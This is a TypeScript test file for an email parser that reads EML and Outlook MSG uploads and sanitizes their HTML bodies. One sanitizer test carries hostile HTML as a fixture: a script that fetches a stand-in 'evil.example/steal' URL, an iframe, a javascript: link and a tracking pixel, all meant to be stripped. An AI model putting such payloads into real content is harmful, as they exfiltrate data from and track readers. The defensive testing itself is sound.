// SPDX-License-Identifier: AGPL-3.0-only

/**
 * The email parser (M12/5, DOC-004).
 *
 * This is the one seam in the milestone whose behaviour is a pure
 * function of bytes, so it is asserted here rather than over HTTP: an
 * EML and a MSG carrying the same message must answer the same shape,
 * an HTML body must come out with nothing executable in it, and bytes
 * that are not an email must fail terminally rather than for ever.
 *
 * Everything else about email rendering — who may read it, what the
 * panel draws, where the body's text is stored — is asserted at the HTTP
 * seam, in `document-email.test.ts`.
 */

import { describe, expect, it } from "vitest";
import { emlFixture, msgFixture } from "../../testing/fixtures/email.js";
import {
  emailBodyText,
  EmailUnreadableError,
  isEmail,
  MAX_PARSEABLE_EMAIL_BYTES,
  parseEmail,
  parseStoredEmail,
} from "./parse.js";
import { emailHtmlToText, sanitizeEmailHtml } from "./sanitize.js";

/** The declared type a browser sends for each container. */
const EML = "message/rfc822";
const MSG = "application/vnd.ms-outlook";

/** The same message, told twice: once as a MIME message and once as an
 * Outlook one. Every case that has to hold for both is driven from this
 * table, because "an EML and a MSG read the same" is the promise. */
const CONTAINERS = [
  { label: "EML", build: emlFixture, mimeType: EML, filename: "round-three.eml" },
  { label: "MSG", build: msgFixture, mimeType: MSG, filename: "round-three.msg" },
] as const;

describe("reading an uploaded email", () => {
  for (const container of CONTAINERS) {
    it(`reads a ${container.label}'s headers, body, and attachment list`, async () => {
      const bytes = container.build({
        subject: "Re: Orion MSA — round three",
        from: { name: "Nadia Counsel", address: "nadia@example.com" },
        to: [{ name: "Otto Outsider", address: "otto@example.com" }],
        cc: [{ address: "legal@example.com" }],
        text: "The redline is attached.",
        attachments: [
          {
            filename: "round-three.pdf",
            mimeType: "application/pdf",
            content: Buffer.from("%PDF-1.4 round three"),
          },
        ],
      });

      const email = await parseEmail(bytes, container.mimeType, container.filename);

      expect(email.subject).toBe("Re: Orion MSA — round three");
      expect(email.from).toEqual({ name: "Nadia Counsel", address: "nadia@example.com" });
      expect(email.to).toEqual([{ name: "Otto Outsider", address: "otto@example.com" }]);
      expect(email.cc.map((address) => address.address)).toEqual(["legal@example.com"]);
      expect(email.text).toBe("The redline is attached.");
      expect(email.attachments).toHaveLength(1);
      const [attachment] = email.attachments;
      expect(attachment).toMatchObject({
        index: 0,
        filename: "round-three.pdf",
        mimeType: "application/pdf",
        isInline: false,
      });
      expect(attachment!.content?.toString()).toBe("%PDF-1.4 round three");
      expect(attachment!.byteSize).toBe(attachment!.content?.byteLength);
    });

    it(`sanitizes a ${container.label}'s HTML body before anything can render it`, async () => {
      const bytes = container.build({
        from: { address: "sender@example.com" },
        html:
          "<p>Here is the <b>redline</b>.</p>" +
          "<script>fetch('https://evil.example/steal')</script>" +
          '<img src="https://tracker.example/pixel.gif">' +
          '<iframe src="https://evil.example"></iframe>' +
          '<a href="javascript:alert(1)">press me</a>' +
          '<a href="https://example.com/deal">the deal</a>',
      });

      const email = await parseEmail(bytes, container.mimeType, container.filename);

      expect(email.html).not.toBeNull();
      const html = email.html!;
      // What a reader came for survives.
      expect(html).toContain("<b>redline</b>");
      // What could run, fetch, or report does not.
      expect(html).not.toContain("<script");
      expect(html).not.toContain("fetch(");
      expect(html).not.toContain("<img");
      expect(html).not.toContain("tracker.example");
      expect(html).not.toContain("<iframe");
      expect(html).not.toContain("javascript:");
      // A real link keeps its address, and loses its handle back to the
      // window that opened it.
      expect(html).toContain('href="https://example.com/deal"');
      expect(html).toContain('rel="noopener noreferrer"');
    });

    it(`takes a ${container.label}'s attachment content id as inline`, async () => {
      const bytes = container.build({
        from: { address: "sender@example.com" },
        html: '<p>Regards</p><img src="cid:signature">',
        attachments: [
          {
            filename: "signature.png",
            mimeType: "image/png",
            content: Buffer.from("PNG-ish bytes"),
            contentId: "signature",
          },
        ],
      });

      const email = await parseEmail(bytes, container.mimeType, container.filename);

      // Listed, because the body never draws it — the attachment list is
      // the only way a reader reaches an inlined image at all.
      expect(email.attachments).toHaveLength(1);
      expect(email.attachments[0]).toMatchObject({ filename: "signature.png", isInline: true });
    });

    it(`refuses bytes that are not a ${container.label}, terminally`, async () => {
      await expect(
        parseEmail(
          Buffer.from("this is not an email at all"),
          container.mimeType,
          container.filename,
        ),
      ).rejects.toBeInstanceOf(EmailUnreadableError);
    });
  }

  it("reads the date a message carries", async () => {
    const bytes = emlFixture({
      from: { address: "sender@example.com" },
      date: "Tue, 11 Aug 2026 09:00:00 +0000",
      text: "Morning.",
    });

    const email = await parseEmail(bytes, EML, "dated.eml");

    expect(email.date).toBe("2026-08-11T09:00:00.000Z");
  });

  it("answers a null date for a message whose date header is nonsense", async () => {
    const bytes = emlFixture({
      from: { address: "sender@example.com" },
      date: "the day before yesterday",
      text: "Morning.",
    });

    // A broken header is not a broken message. The rest of it still
    // reads.
    const email = await parseEmail(bytes, EML, "undated.eml");

    expect(email.date).toBeNull();
    expect(email.text).toBe("Morning.");
  });

  it("names an attachment that arrived without a name", async () => {
    // Written by hand: the fixture builder always names what it
    // attaches, and this is the message that does not.
    const bytes = Buffer.from(
      [
        "From: sender@example.com",
        "Subject: no name",
        "MIME-Version: 1.0",
        'Content-Type: multipart/mixed; boundary="b"',
        "",
        "--b",
        "Content-Type: text/plain",
        "",
        "see attached",
        "--b",
        "Content-Type: application/pdf",
        "Content-Disposition: attachment",
        "Content-Transfer-Encoding: base64",
        "",
        Buffer.from("%PDF-1.4 unnamed").toString("base64"),
        "--b--",
        "",
      ].join("\r\n"),
    );

    const email = await parseEmail(bytes, EML, "unnamed.eml");

    // A download needs a name, so one is made from where the file sat in
    // the message and what it said it was.
    expect(email.attachments[0]?.filename).toBe("attachment-1.pdf");
  });

  it("reads an Outlook message whose HTML body is stored as bytes", async () => {
    // Outlook writes the HTML body as a string property or as a binary
    // one, depending on its version. Both are the same body to a reader.
    const bytes = msgFixture({
      from: { address: "sender@example.com" },
      html: "<p>Written as bytes.</p>",
      htmlAsBinary: true,
    });

    const email = await parseEmail(bytes, MSG, "binary-body.msg");

    expect(email.html).toContain("Written as bytes.");
  });

  it("refuses a stored email past the parsing limit before it holds all of it", async () => {
    // The bound is applied while the bytes arrive, not after: a file this
    // size must never be held whole on its way to being refused.
    const chunk = Buffer.alloc(1024 * 1024);
    let read = 0;
    async function* stored() {
      for (let sent = 0; sent <= MAX_PARSEABLE_EMAIL_BYTES; sent += chunk.byteLength) {
        read += chunk.byteLength;
        yield chunk;
      }
    }

    await expect(parseStoredEmail(stored(), EML, "enormous.eml")).rejects.toBeInstanceOf(
      EmailUnreadableError,
    );
    // It stopped at the ceiling rather than reading to the end of the
    // stream and then complaining.
    expect(read).toBeLessThanOrEqual(MAX_PARSEABLE_EMAIL_BYTES + chunk.byteLength);
  });

  it("refuses an email past the parsing limit, terminally", async () => {
    const huge = Buffer.alloc(MAX_PARSEABLE_EMAIL_BYTES + 1);

    // In memory is the whole reason the bound exists, and a retry does
    // not make the file smaller.
    await expect(parseEmail(huge, EML, "enormous.eml")).rejects.toBeInstanceOf(
      EmailUnreadableError,
    );
  });

  it("routes both containers to the email family and nothing else to it", () => {
    expect(isEmail(EML, "thread.eml")).toBe(true);
    expect(isEmail(MSG, "thread.msg")).toBe(true);
    // An upload that declared nothing still routes on its name.
    expect(isEmail("application/octet-stream", "thread.msg")).toBe(true);
    expect(isEmail("application/pdf", "agreement.pdf")).toBe(false);
  });
});

describe("the words an email body yields", () => {
  it("prefers the plain-text body the sender wrote", async () => {
    const bytes = emlFixture({
      from: { address: "sender@example.com" },
      text: "The redline is attached.",
      html: "<p>The redline is <b>attached</b>.</p>",
    });

    const email = await parseEmail(bytes, EML, "both.eml");

    // Both bodies say the same thing, and one of them is what a person
    // typed.
    expect(emailBodyText(email)).toBe("The redline is attached.");
  });

  it("reads an HTML-only body as text, with its lines kept", async () => {
    const bytes = emlFixture({
      from: { address: "sender@example.com" },
      html: "<p>First paragraph.</p><p>Second &amp; last.</p>",
    });

    const email = await parseEmail(bytes, EML, "html-only.eml");

    // Entities decoded, paragraphs still paragraphs: this text is what
    // M25 will search, and a run-on line searches worse than the message
    // it came from.
    expect(emailBodyText(email)).toBe("First paragraph.\nSecond & last.");
  });

  it("leaves an entity nobody knows exactly as it was written", () => {
    // `&constructor;` names no character. The lookup is a map rather than
    // an object literal, so a name that happens to be a property of every
    // object in the language — and the function behind it — never reaches
    // a document's text. `&hellip;` is one the parser itself knows, and
    // `&amp;` is one this pass decodes.
    expect(emailHtmlToText("<p>&constructor; &hellip; &amp;</p>")).toBe("&constructor; … &");
  });

  it("keeps nothing a sender hid in markup", () => {
    const text = emailHtmlToText(
      "<p>Visible.</p><style>.x{content:'invisible'}</style><script>const secret = 1;</script>",
    );

    expect(text).toBe("Visible.");
  });

  it("answers an empty body for a message that was only a tracking pixel", () => {
    expect(sanitizeEmailHtml('<img src="https://tracker.example/pixel.gif">')).toBe("");
  });
});
